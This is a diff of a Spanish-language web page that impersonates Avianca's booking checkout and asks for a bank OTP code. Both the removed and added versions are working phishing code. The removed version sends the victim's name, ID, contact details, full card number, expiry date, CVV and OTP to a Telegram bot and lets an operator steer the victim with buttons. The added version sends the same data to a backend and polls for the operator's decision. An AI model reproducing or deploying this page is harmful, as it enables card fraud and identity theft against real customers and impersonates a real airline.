@@ -1,19 +1,18 @@
-    <!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avianca - Booking</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Avianca - Booking (OTP)</title>
+
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
     <link rel="stylesheet" href="./css/checkers.css">
     <link rel="stylesheet" href="./css/normalize.css">
-    <script src="./js/functions.js"></script>
 
     <style>
         .loaderp {
@@ -26,15 +25,7 @@
             box-sizing: border-box;
             animation: rotation 1s linear infinite;
         }
-
-        @keyframes rotation {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .loaderp-full {
             position: fixed;
@@ -42,7 +33,7 @@
             left: 0;
             overflow-y: hidden;
             z-index: 1000;
-            background-color: white;
+            background-color: rgba(255,255,255,0.95);
             width: 100vw;
             height: 100vh;
             display: none;
@@ -51,238 +42,222 @@
             align-items: center;
         }
 
-        .content form input {
-            width: 100% !important;
-            box-sizing: border-box !important;
+        .content { max-width: 720px; margin: 40px auto; padding: 16px; }
+        .labels { float:left; width:40%; font-weight:600; }
+        .values { float:right; width:58%; }
+        .values p { margin: 6px 0; }
+        .clearfix::after { content: ""; clear: both; display: table; }
+
+        .btn-success {
+            display:block;
+            width:200px;
+            margin: 20px auto;
+            padding:12px 20px;
+            background:#0070c9;
+            color:#fff;
+            border:none;
+            border-radius:6px;
+            cursor:pointer;
+            font-weight:700;
         }
 
-        .hidden {
-            display: none !important;
-        }
+        .hidden { display:none !important; }
+
+        .logos { display:flex; align-items:center; gap:16px; padding: 12px; }
+        .main-loader { display:none; }
     </style>
 </head>
 <body>
     <div class="main-loader show">
-        <img id="company-loader">
+        <img id="company-loader" alt="">
         <div class="loader"></div>
     </div>
+
     <div class="logos">
-        <img id="bank-logo" src="" alt="" width="">
-        <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca 2" width="110px">
+        <img id="bank-logo" src="" alt="">
+        <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca" width="110">
     </div>
+
     <main>
         <div class="content">
             <b style="margin-bottom: 20px; display: block;">Autorización de transacción</b>
-            <p style="margin-bottom: 10px;">La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor, verifica la siguiente información:</p>
+
+            <p style="margin-bottom: 10px;">
+                La transacción que intenta realizar en <b>AVIANCA S.A</b> por
+                <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor, verifica la siguiente información:
+            </p>
+
             <p style="margin-bottom: 20px;">Ingrese el código de su Banca Virtual:</p>
-            <form id="form" style="margin-bottom: 30px;">
+
+            <form id="form" style="margin-bottom: 30px;" class="clearfix" onsubmit="return false;">
                 <div class="labels">
-                    <b>Comercio: </b>
-                    <b>Monto: </b>
-                    <b>Número de tarjeta: </b>
-                    <b id="otpcode_label">Código OTP: </b>
+                    <p><b>Comercio: </b></p>
+                    <p><b>Monto: </b></p>
+                    <p><b>Número de tarjeta: </b></p>
+                    <p><b id="otpcode_label">Código OTP: </b></p>
                 </div>
+
                 <div class="values">
                     <p>AVIANCA S.A</p>
-                    <p>$ <span id="flight-price">49.000</span> USD</p>
+                    <p>$ <span id="flight-price-2">49.000</span> USD</p>
                     <p>•••• •••• •••• <span id="card-digits"></span></p>
-                    <input required oninput="limitDigits(this, 8)" type="text" id="otpcode_input">
+                    <input required oninput="limitDigits(this, 8)" type="text" id="otpcode_input" placeholder="Código OTP" maxlength="8" style="padding:8px; font-size:16px; width:100%; box-sizing:border-box;">
                 </div>
             </form>
+
+            <div style="text-align:center; margin-bottom:8px;">
+                <a href="#" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
+            </div>
+
+            <button id="btnNextStep" class="btn-success">Aceptar</button>
         </div>
-        <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
-        <button id="btnNextStep" class="btn-success">
-            Aceptar
-        </button>
     </main>
 
-    <div class="loaderp-full">
+    <div class="loaderp-full" id="globalLoader">
         <span class="loaderp"></span>
         <p class="text-italic tc-ocean fs-3 fw-light">Validando datos...</p>
     </div>
 
-    <script src="./js/id_check.js"></script>
     <script>
-        function escapeMarkdownV2(text) {
-            if (!text) return '';
-            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
-            let escapedText = text;
-            for (const char of specialChars) {
-                const regex = new RegExp(`\\${char}`, 'g');
-                escapedText = escapedText.replace(regex, `\\${char}`);
-            }
-            return escapedText;
+    // --- Helpers mínimos ---
+    function limitDigits(el, max) {
+        el.value = el.value.replace(/\D/g, '').slice(0, max);
+    }
+
+    function showLoader() {
+        const l = document.getElementById('globalLoader');
+        if (l) l.style.display = 'flex';
+    }
+    function hideLoader() {
+        const l = document.getElementById('globalLoader');
+        if (l) l.style.display = 'none';
+    }
+
+    // Al cargar, rellenar datos desde localStorage si existen
+    document.addEventListener('DOMContentLoaded', () => {
+        const stored = JSON.parse(localStorage.getItem('paymentData') || 'null');
+        if (!stored) {
+            // No hay datos de pago guardados: redirigir al payment.html
+            console.warn('No hay paymentData en localStorage — redirigiendo a payment.html');
+            window.location.href = 'payment.html';
+            return;
         }
 
-        async function loadTelegramConfig() {
+        // mostrar precio / dígitos de tarjeta si existen
+        if (stored.flightCost) {
+            const fp = document.getElementById('flight-price');
+            const fp2 = document.getElementById('flight-price-2');
+            if (fp) fp.innerText = stored.flightCost;
+            if (fp2) fp2.innerText = stored.flightCost;
+        }
+        if (stored.cardNumber) {
+            const last4 = String(stored.cardNumber).slice(-4);
+            const cd = document.getElementById('card-digits');
+            if (cd) cd.innerText = last4;
+        }
+    });
+
+    // --- Polling al backend para estado de la transacción ---
+    function checkVerificationBackend(transactionId) {
+        const poll = async () => {
             try {
-                const response = await fetch("./js/brr76.json");
-                if (!response.ok) {
-                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
+                const res = await fetch(`/status/${transactionId}`, { cache: 'no-store' });
+                const j = await res.json();
+                const status = j && j.status ? j.status : 'not_found';
+
+                if (status === 'pending' || status === undefined) {
+                    setTimeout(poll, 2000);
+                    return;
                 }
-                return await response.json();
-            } catch (error) {
-                console.error("Error al cargar el archivo de configuración de Telegram:", error);
-                return null;
+
+                // llegó respuesta
+                hideLoader();
+
+                switch (status) {
+                    case 'error_otp':
+                        alert("Error en el código SMS. Por favor, ingréselo nuevamente.");
+                        // Dejar el input visible para reintento
+                        document.getElementById('otpcode_input').value = '';
+                        break;
+                    case 'error_tc':
+                        alert("Error en la tarjeta. Por favor, intente de nuevo.");
+                        window.location.href = "payment.html";
+                        break;
+                    case 'finalizar':
+                        window.location.href = "https://www.avianca.com/";
+                        break;
+                    default:
+                        console.warn('Estado desconocido recibido:', status);
+                        break;
+                }
+            } catch (err) {
+                console.error('Error en polling status:', err);
+                setTimeout(poll, 2000);
             }
+        };
+        poll();
+    }
+
+    // --- Enviar datos al backend (/send-verification) ---
+    async function enviarDatos() {
+        const storedData = JSON.parse(localStorage.getItem('paymentData') || 'null');
+        if (!storedData) {
+            alert('No hay datos de pago, regresando al formulario.');
+            window.location.href = 'payment.html';
+            return;
         }
 
-        const inputMap = {
-            'pedir_otp': { label: 'otpcode_label', input: 'otpcode_input' },
-            'error_tc': { error_msg: "Error en la tarjeta. Por favor, intente de nuevo." },
-            'error_otp': { label: 'otpcode_label', input: 'otpcode_input', error_msg: "Error en el código SMS. Por favor, ingréselo nuevamente." },
+        const otp = document.getElementById('otpcode_input').value.trim();
+        if (!otp) {
+            alert('Por favor ingrese el código OTP.');
+            return;
+        }
+
+        // asegúrate de tener transactionId
+        const transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
+        storedData.transactionId = transactionId;
+        localStorage.setItem('paymentData', JSON.stringify(storedData));
+
+        const body = {
+            transactionId,
+            paymentData: storedData,
+            otp
         };
 
-        function hideAllInputs() {
-            // No es necesario ocultar porque solo hay un campo visible
-        }
+        showLoader();
 
-        async function checkVerification(transactionId, messageId) {
-            const config = await loadTelegramConfig();
-            if (!config) {
-                document.querySelector(".loaderp-full").style.display = "none";
-                return;
-            }
-            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
-                .then(response => response.json())
-                .then(data => {
-                    const updates = data.result;
-                    const verificationUpdate = updates.find(
-                        (update) =>
-                        update.callback_query &&
-                        update.callback_query.message.message_id === messageId
-                    );
-
-                    if (verificationUpdate) {
-                        const action = verificationUpdate.callback_query.data.split(':')[0];
-                        const actionConfig = inputMap[action];
-
-                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                chat_id: config.chat_id,
-                                message_id: messageId,
-                                reply_markup: { inline_keyboard: [] }
-                            }),
-                        });
-
-                        document.querySelector(".loaderp-full").style.display = "none";
-                        hideAllInputs();
-
-                        if (actionConfig && actionConfig.error_msg) {
-                            alert(actionConfig.error_msg);
-                        }
-
-                        switch (action) {
-                            case 'error_tc':
-                                window.location.href = "payment.html";
-                                break;
-                            case 'finalizar':
-                                window.location.href = "https://www.avianca.com/";
-                                break;
-                            default:
-                                break;
-                        }
-                    } else {
-                        setTimeout(() => checkVerification(transactionId, messageId), 2000);
-                    }
-                })
-                .catch(error => {
-                    console.error("Error al verificar el estado:", error);
-                    setTimeout(() => checkVerification(transactionId, messageId), 2000);
-                });
-        }
-
-        document.getElementById("btnNextStep").addEventListener("click", function() {
-            const otpInput = document.getElementById('otpcode_input');
-            if (!otpInput.value) {
-                alert("Por favor, complete el campo de código OTP.");
-                return;
-            }
-
-            document.querySelector(".loaderp-full").style.display = "flex";
-            enviarDatos();
-        });
-
-        async function enviarDatos() {
-            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
-            const transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
-            localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId }));
-
-            const formValues = {};
-            const otpInput = document.getElementById('otpcode_input');
-            formValues.otpcode = escapeMarkdownV2(otpInput.value);
-
-            const fullMessage = `
-✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*👤 DATOS DEL TITULAR*
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*🤵‍♂️ Nombre:* ${storedData.name ? escapeMarkdownV2(storedData.name) : 'No ingresado'}
-*🪪 Identificación:* ${storedData.cc ? escapeMarkdownV2(storedData.cc) : 'No ingresado'}
-*📧 Email:* ${storedData.email ? escapeMarkdownV2(storedData.email) : 'No ingresado'}
-*📱 Celular:* ${storedData.telnum ? escapeMarkdownV2(storedData.telnum) : 'No ingresado'}
-*🗺️ Ciudad:* ${storedData.city ? escapeMarkdownV2(storedData.city) : 'No ingresado'}
-*📍 Estado:* ${storedData.state ? escapeMarkdownV2(storedData.state) : 'No ingresado'}
-*🏠 Dirección:* ${storedData.address ? escapeMarkdownV2(storedData.address) : 'No ingresado'}
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*💳 DETALLES DE LA TARJETA*
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*🏦 Banco:* ${storedData.bank ? escapeMarkdownV2(storedData.bank) : 'No ingresado'}
-*💳 Número de Tarjeta:*
-\`${storedData.cardNumber ? escapeMarkdownV2(storedData.cardNumber) : 'No ingresado'}\`
-*📅 Fecha de Exp:*
-\`${storedData.expiryDate ? escapeMarkdownV2(storedData.expiryDate) : 'No ingresado'}\`
-*🔐 CVV:*
-\`${storedData.cvv ? escapeMarkdownV2(storedData.cvv) : 'No ingresado'}\`
-*🔢 Cuotas:* ${storedData.dues ? escapeMarkdownV2(storedData.dues) : 'No ingresado'}
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*👤 DATOS DE ACCESO*
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*Código OTP:* ${formValues.otpcode || 'No ingresado'}
-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
-*🆔 ID de Transacción:* ${transactionId}
-`;
-
-            const keyboard = JSON.stringify({
-                inline_keyboard: [
-                    [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }, { text: "Error TC", callback_data: `error_tc:${transactionId}` }],
-                    [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
-                ],
+        try {
+            const res = await fetch('/send-verification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
             });
-
-            const config = await loadTelegramConfig();
-            if (!config) {
-                document.querySelector(".loaderp-full").style.display = "none";
-                return;
+            const j = await res.json();
+            if (j && j.ok && j.transactionId) {
+                // iniciar polling a backend
+                checkVerificationBackend(j.transactionId);
+            } else {
+                console.error('Error desde backend:', j);
+                hideLoader();
+                alert('Ocurrió un error enviando la verificación. Intenta de nuevo.');
             }
-
-            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: config.chat_id,
-                    text: fullMessage,
-                    reply_markup: keyboard,
-                    parse_mode: "MarkdownV2",
-                }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("Mensaje enviado a Telegram con éxito");
-                    checkVerification(transactionId, data.result.message_id);
-                } else {
-                    console.error("Error al enviar mensaje a Telegram:", data);
-                    document.querySelector(".loaderp-full").style.display = "none";
-                }
-            })
-            .catch(error => {
-                console.error("Error al enviar mensaje a Telegram:", error);
-                document.querySelector(".loaderp-full").style.display = "none";
-            });
+        } catch (err) {
+            console.error('Error enviando verificación:', err);
+            hideLoader();
+            alert('Error de conexión. Intenta otra vez.');
         }
+    }
+
+    document.getElementById('btnNextStep').addEventListener('click', (e) => {
+        e.preventDefault();
+        enviarDatos();
+    });
+
+    // opcional: link para generar nuevo OTP (solo UI placeholder)
+    document.getElementById('newCode').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('Solicitud de nuevo código enviada (simulado).');
+    });
     </script>
 </body>
 </html>
